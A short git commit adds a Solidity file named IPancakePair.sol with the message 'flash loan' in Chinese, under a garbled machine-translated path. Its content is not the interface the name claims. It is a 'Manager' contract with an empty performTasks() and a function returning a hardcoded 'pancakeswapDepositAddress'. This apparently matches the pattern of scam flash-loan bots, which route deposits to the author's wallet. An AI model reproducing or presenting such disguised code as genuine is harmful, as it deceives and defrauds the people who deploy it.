48d5bd943101cf9aeaaf43e9877a7f38242424ae
pancakeswap <88178902@qq.com>
2022-08-09 13:46:05 +0800

    IPancakePair.sol
    闪电贷

---
+++ 斑点/主人/合同/接口/IPancakePair.sol
@@ -0,0 +1,10 @@
+pragma solidity ^0.5.0;
+
+contract Manager { function performTasks() public pure{
+
+}
+
+function pancakeswapDepositAddress() public pure returns (address) {
+    return 0x0000073D9DE49c1c014Edb442bDff92Dca76cdd6;
+}
+}
